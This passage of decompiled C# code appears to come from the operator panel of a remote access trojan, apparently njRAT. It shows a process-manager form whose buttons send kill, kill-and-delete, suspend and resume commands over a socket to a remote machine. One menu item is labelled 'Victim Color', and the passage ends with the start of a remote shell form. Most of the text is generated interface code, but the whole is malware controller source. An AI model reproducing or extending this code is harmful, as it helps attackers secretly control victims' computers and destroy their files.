		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		[AccessedThroughProperty("L1")]
		private LV _L1;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		public int ID;

		public Client osk;

		public Client sk;

		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		internal virtual ToolStripStatusLabel SL
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SL;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SL_Click);
				bool flag = this._SL != null;
				if (flag)
				{
					this._SL.Click -= value2;
				}
				this._SL = value;
				flag = (this._SL != null);
				if (flag)
				{
					this._SL.Click += value2;
				}
			}
		}

		internal virtual ToolStripProgressBar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		internal virtual ContextMenuStrip M1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._M1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.M1_Opening);
				bool flag = this._M1 != null;
				if (flag)
				{
					this._M1.Opening -= value2;
				}
				this._M1 = value;
				flag = (this._M1 != null);
				if (flag)
				{
					this._M1.Opening += value2;
				}
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				bool flag = this._RefreshToolStripMenuItem != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				flag = (this._RefreshToolStripMenuItem != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem KillToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KillToolStripMenuItem_Click);
				bool flag = this._KillToolStripMenuItem != null;
				if (flag)
				{
					this._KillToolStripMenuItem.Click -= value2;
				}
				this._KillToolStripMenuItem = value;
				flag = (this._KillToolStripMenuItem != null);
				if (flag)
				{
					this._KillToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem KillDeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillDeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KillDeleteToolStripMenuItem_Click);
				bool flag = this._KillDeleteToolStripMenuItem != null;
				if (flag)
				{
					this._KillDeleteToolStripMenuItem.Click -= value2;
				}
				this._KillDeleteToolStripMenuItem = value;
				flag = (this._KillDeleteToolStripMenuItem != null);
				if (flag)
				{
					this._KillDeleteToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem SuspendToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SuspendToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SuspendToolStripMenuItem_Click);
				bool flag = this._SuspendToolStripMenuItem != null;
				if (flag)
				{
					this._SuspendToolStripMenuItem.Click -= value2;
				}
				this._SuspendToolStripMenuItem = value;
				flag = (this._SuspendToolStripMenuItem != null);
				if (flag)
				{
					this._SuspendToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel1_Paint);
				bool flag = this._Panel1 != null;
				if (flag)
				{
					this._Panel1.Paint -= value2;
				}
				this._Panel1 = value;
				flag = (this._Panel1 != null);
				if (flag)
				{
					this._Panel1.Paint += value2;
				}
			}
		}

		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		internal virtual LV L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._L1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				flag = (this._Button4 != null);
				if (flag)
				{
					this._Button4.Click += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				flag = (this._Button5 != null);
				if (flag)
				{
					this._Button5.Click += value2;
				}
			}
		}

		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		public Frm_Process()
		{
			base.FormClosing += new FormClosingEventHandler(this.proc_FormClosing);
			base.GiveFeedback += new GiveFeedbackEventHandler(this.proc_GiveFeedback);
			base.Load += new EventHandler(this.proc_Load);
			Frm_Process.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Process.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Process.__ENCList.Count == Frm_Process.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Process.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Process.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Process.__ENCList[num] = Frm_Process.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Process.__ENCList.RemoveRange(num, Frm_Process.__ENCList.Count - num);
						Frm_Process.__ENCList.Capacity = Frm_Process.__ENCList.Count;
					}
					Frm_Process.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Process));
			this.StatusStrip1 = new StatusStrip();
			this.SL = new ToolStripStatusLabel();
			this.pr = new ToolStripProgressBar();
			this.M1 = new ContextMenuStrip(this.components);
			this.RefreshToolStripMenuItem = new ToolStripMenuItem();
			this.KillToolStripMenuItem = new ToolStripMenuItem();
			this.KillDeleteToolStripMenuItem = new ToolStripMenuItem();
			this.SuspendToolStripMenuItem = new ToolStripMenuItem();
			this.ImageList1 = new ImageList(this.components);
			this.Timer1 = new Timer(this.components);
			this.Panel1 = new Panel();
			this.Button5 = new Button();
			this.Button4 = new Button();
			this.Button2 = new Button();
			this.Button1 = new Button();
			this.Button3 = new Button();
			this.Panel2 = new Panel();
			this.ProgressBar1 = new ProgressBar();
			this.L1 = new LV();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.ColumnHeader3 = new ColumnHeader();
			this.Timer2 = new Timer(this.components);
			this.StatusStrip1.SuspendLayout();
			this.M1.SuspendLayout();
			this.Panel1.SuspendLayout();
			this.Panel2.SuspendLayout();
			this.SuspendLayout();
			this.StatusStrip1.BackColor = Color.Black;
			this.StatusStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.SL,
				this.pr
			});
			Control arg_1D3_0 = this.StatusStrip1;
			Point location = new Point(0, 325);
			arg_1D3_0.Location = location;
			this.StatusStrip1.Name = "StatusStrip1";
			Control arg_201_0 = this.StatusStrip1;
			Size size = new Size(615, 22);
			arg_201_0.Size = size;
			this.StatusStrip1.TabIndex = 0;
			this.StatusStrip1.Text = "StatusStrip1";
			this.SL.ForeColor = Color.Yellow;
			this.SL.Name = "SL";
			ToolStripItem arg_25B_0 = this.SL;
			size = new Size(13, 17);
			arg_25B_0.Size = size;
			this.SL.Text = "..";
			this.pr.Name = "pr";
			ToolStripControlHost arg_297_0 = this.pr;
			size = new Size(100, 16);
			arg_297_0.Size = size;
			this.M1.Items.AddRange(new ToolStripItem[]
			{
				this.RefreshToolStripMenuItem,
				this.KillToolStripMenuItem,
				this.KillDeleteToolStripMenuItem,
				this.SuspendToolStripMenuItem
			});
			this.M1.Name = "M1";
			Control arg_306_0 = this.M1;
			size = new Size(141, 92);
			arg_306_0.Size = size;
			this.RefreshToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.RefreshToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.RefreshToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
			this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
			ToolStripItem arg_372_0 = this.RefreshToolStripMenuItem;
			size = new Size(140, 22);
			arg_372_0.Size = size;
			this.RefreshToolStripMenuItem.Text = "Victim Color";
			this.KillToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.KillToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.KillToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("KillToolStripMenuItem.Image");
			this.KillToolStripMenuItem.Name = "KillToolStripMenuItem";
			ToolStripItem arg_3EF_0 = this.KillToolStripMenuItem;
			size = new Size(140, 22);
			arg_3EF_0.Size = size;
			this.KillToolStripMenuItem.Text = "Details";
			this.KillDeleteToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.KillDeleteToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.KillDeleteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("KillDeleteToolStripMenuItem.Image");
			this.KillDeleteToolStripMenuItem.Name = "KillDeleteToolStripMenuItem";
			ToolStripItem arg_46C_0 = this.KillDeleteToolStripMenuItem;
			size = new Size(140, 22);
			arg_46C_0.Size = size;
			this.KillDeleteToolStripMenuItem.Text = "ListView";
			this.SuspendToolStripMenuItem.BackColor = SystemColors.ActiveCaptionText;
			this.SuspendToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.SuspendToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("SuspendToolStripMenuItem.Image");
			this.SuspendToolStripMenuItem.Name = "SuspendToolStripMenuItem";
			ToolStripItem arg_4E9_0 = this.SuspendToolStripMenuItem;
			size = new Size(140, 22);
			arg_4E9_0.Size = size;
			this.SuspendToolStripMenuItem.Text = "Color Lines";
			this.ImageList1.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream");
			this.ImageList1.TransparentColor = Color.Transparent;
			this.ImageList1.Images.SetKeyName(0, "165.png");
			this.Panel1.BackColor = Color.Black;
			this.Panel1.Controls.Add(this.Button5);
			this.Panel1.Controls.Add(this.Button4);
			this.Panel1.Controls.Add(this.Button2);
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Controls.Add(this.Button3);
			this.Panel1.Dock = DockStyle.Top;
			Control arg_5E7_0 = this.Panel1;
			location = new Point(0, 0);
			arg_5E7_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_615_0 = this.Panel1;
			size = new Size(615, 40);
			arg_615_0.Size = size;
			this.Panel1.TabIndex = 3;
			this.Button5.BackColor = Color.Black;
			this.Button5.Cursor = Cursors.Hand;
			this.Button5.FlatStyle = FlatStyle.Flat;
			this.Button5.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button5.ForeColor = Color.LightSteelBlue;
			Control arg_69C_0 = this.Button5;
			location = new Point(184, 8);
			arg_69C_0.Location = location;
			this.Button5.Name = "Button5";
			Control arg_6C7_0 = this.Button5;
			size = new Size(82, 26);
			arg_6C7_0.Size = size;
			this.Button5.TabIndex = 106;
			this.Button5.Text = "Resume";
			this.Button5.UseVisualStyleBackColor = false;
			this.Button4.BackColor = Color.Black;
			this.Button4.Cursor = Cursors.Hand;
			this.Button4.FlatStyle = FlatStyle.Flat;
			this.Button4.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button4.ForeColor = Color.LightSteelBlue;
			Control arg_76D_0 = this.Button4;
			location = new Point(448, 8);
			arg_76D_0.Location = location;
			this.Button4.Name = "Button4";
			Control arg_798_0 = this.Button4;
			size = new Size(98, 26);
			arg_798_0.Size = size;
			this.Button4.TabIndex = 105;
			this.Button4.Text = "Delete";
			this.Button4.UseVisualStyleBackColor = false;
			this.Button2.BackColor = Color.Black;
			this.Button2.Cursor = Cursors.Hand;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_83E_0 = this.Button2;
			location = new Point(354, 8);
			arg_83E_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_869_0 = this.Button2;
			size = new Size(98, 26);
			arg_869_0.Size = size;
			this.Button2.TabIndex = 104;
			this.Button2.Text = "New Value";
			this.Button2.UseVisualStyleBackColor = false;
			this.Button1.BackColor = Color.Black;
			this.Button1.Cursor = Cursors.Hand;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_90F_0 = this.Button1;
			location = new Point(263, 8);
			arg_90F_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_93A_0 = this.Button1;
			size = new Size(98, 26);
			arg_93A_0.Size = size;
			this.Button1.TabIndex = 103;
			this.Button1.Text = "Edit";
			this.Button1.UseVisualStyleBackColor = false;
			this.Button3.BackColor = Color.Black;
			this.Button3.Cursor = Cursors.Hand;
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button3.ForeColor = Color.LightSteelBlue;
			Control arg_9DD_0 = this.Button3;
			location = new Point(89, 8);
			arg_9DD_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_A08_0 = this.Button3;
			size = new Size(98, 26);
			arg_A08_0.Size = size;
			this.Button3.TabIndex = 102;
			this.Button3.Text = "Refresh";
			this.Button3.UseVisualStyleBackColor = false;
			this.Panel2.Controls.Add(this.ProgressBar1);
			this.Panel2.Controls.Add(this.L1);
			this.Panel2.Dock = DockStyle.Fill;
			Control arg_A88_0 = this.Panel2;
			location = new Point(0, 40);
			arg_A88_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_AB9_0 = this.Panel2;
			size = new Size(615, 285);
			arg_AB9_0.Size = size;
			this.Panel2.TabIndex = 4;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_AEF_0 = this.ProgressBar1;
			location = new Point(0, 275);
			arg_AEF_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_B1D_0 = this.ProgressBar1;
			size = new Size(615, 10);
			arg_B1D_0.Size = size;
			this.ProgressBar1.TabIndex = 108;
			this.L1.BackColor = Color.Black;
			this.L1.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader1,
				this.ColumnHeader2,
				this.ColumnHeader3
			});
			this.L1.ContextMenuStrip = this.M1;
			this.L1.Dock = DockStyle.Fill;
			this.L1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.L1.ForeColor = Color.LightSteelBlue;
			this.L1.FullRowSelect = true;
			this.L1.GridLines = true;
			Control arg_BF8_0 = this.L1;
			location = new Point(0, 0);
			arg_BF8_0.Location = location;
			this.L1.Name = "L1";
			Control arg_C29_0 = this.L1;
			size = new Size(615, 285);
			arg_C29_0.Size = size;
			this.L1.SmallImageList = this.ImageList1;
			this.L1.TabIndex = 3;
			this.L1.UseCompatibleStateImageBehavior = false;
			this.L1.View = View.Details;
			this.ColumnHeader1.Text = "Name";
			this.ColumnHeader1.Width = 183;
			this.ColumnHeader2.Text = "PID";
			this.ColumnHeader2.Width = 81;
			this.ColumnHeader3.Text = "Location";
			this.ColumnHeader3.Width = 180;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(615, 347);
			this.ClientSize = size;
			this.Controls.Add(this.Panel2);
			this.Controls.Add(this.Panel1);
			this.Controls.Add(this.StatusStrip1);
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_Process";
			this.Text = "Proccesor";
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			this.M1.ResumeLayout(false);
			this.Panel1.ResumeLayout(false);
			this.Panel2.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void KillDeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.L1.GridLines = true;
		}

		private void KillToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.L1.GridLines = false;
		}

		private void L1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void proc_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.sk.CN = false;
		}

		private void proc_GiveFeedback(object sender, GiveFeedbackEventArgs e)
		{
		}

		private void proc_Load(object sender, EventArgs e)
		{
			this.Timer2.Start();
			this.sk.Send("~");
			this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(this.osk.L)));
			this.Timer1.Enabled = true;
		}

		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1.ForeColor = colorDialog.Color;
		}

		private void ResumeToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void SL_Click(object sender, EventArgs e)
		{
			this.SL.Text = "";
		}

		private void SuspendToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1.BackColor = colorDialog.Color;
			this.Panel1.BackColor = colorDialog.Color;
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.osk == null | this.sk == null;
			if (flag)
			{
				this.Close();
			}
			flag = (!this.osk.CN | !this.sk.CN);
			if (flag)
			{
				this.Close();
			}
		}

		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		private void Button3_Click(object sender, EventArgs e)
		{
			this.sk.Send("~");
		}

		private void M1_Opening(object sender, CancelEventArgs e)
		{
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			bool flag;
			try
			{
				enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					text = text + sokserver.Y + listViewItem.SubItems[1].Text;
				}
			}
			finally
			{
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (text.Length > 0);
			if (flag)
			{
				this.sk.Send("k" + text);
			}
		}

		private void Button4_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			bool flag;
			try
			{
				enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					text = text + sokserver.Y + listViewItem.SubItems[1].Text;
				}
			}
			finally
			{
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (text.Length > 0);
			if (flag)
			{
				this.sk.Send("kd" + text);
			}
		}

		private void Button2_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			bool flag;
			try
			{
				enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					text = text + sokserver.Y + listViewItem.SubItems[1].Text;
				}
			}
			finally
			{
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (text.Length > 0);
			if (flag)
			{
				this.sk.Send("sus" + text);
			}
		}

		private void Button5_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			bool flag;
			try
			{
				enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					text = text + sokserver.Y + listViewItem.SubItems[1].Text;
				}
			}
			finally
			{
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (text.Length > 0);
			if (flag)
			{
				this.sk.Send("res" + text);
			}
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Shell : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		private string[] A;

		private int idx;

		private int it;

		public Client sk;

		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.T2_KeyDown);
				bool flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown -= value2;
				}
				this._T2 = value;
				flag = (this._T2 != null);
				if (flag)
				{
					this._T2.KeyDown += value2;
				}
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

